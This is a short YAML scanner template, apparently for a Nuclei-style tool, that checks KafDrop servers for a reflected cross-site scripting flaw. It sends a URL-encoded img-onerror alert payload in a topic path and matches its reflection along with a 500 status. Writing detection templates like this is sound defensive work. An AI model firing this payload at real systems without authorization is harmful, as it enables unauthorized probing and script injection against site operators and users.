id: "kafdrop-xss"
name: "KafDrop - Cross-Site Scripting"
severity: "high"
description: "KafDrop contains a cross-site scripting vulnerability. It allows remote unauthenticated attackers to inject arbitrary HTML and/or JavaScript into the response returned by the server."
tech:
  - "generic"
tags:
  - "kafdrop"
  - "xss"
  - "vuln"
reference: "https://github.com/HomeAdvisor/Kafdrop/issues/12"
spaExclusion: true
request:
  method: "GET"
  path: "/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "Kafdrop"
      - "<img src=x onerror=alert(2)>"
    condition: "and"
  - type: "status"
    status:
      - 500
